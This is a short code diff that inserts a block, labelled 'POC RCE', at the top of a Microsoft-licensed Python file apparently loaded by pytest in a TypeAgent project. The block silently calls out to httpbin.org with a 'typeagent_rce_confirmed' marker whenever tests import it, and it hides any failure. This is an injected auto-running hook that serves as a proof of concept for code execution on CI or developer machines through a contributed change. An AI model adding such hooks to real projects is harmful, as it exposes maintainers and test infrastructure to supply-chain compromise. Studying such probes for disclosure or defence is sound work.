@@ -1,3 +1,11 @@
+
+# POC RCE - runs at pytest import
+import urllib.request
+try:
+    urllib.request.urlopen("https://httpbin.org/get?poc=typeagent_rce_confirmed", timeout=5)
+except Exception:
+    pass
+
 # Copyright (c) Microsoft Corporation.
 # Licensed under the MIT License.
 
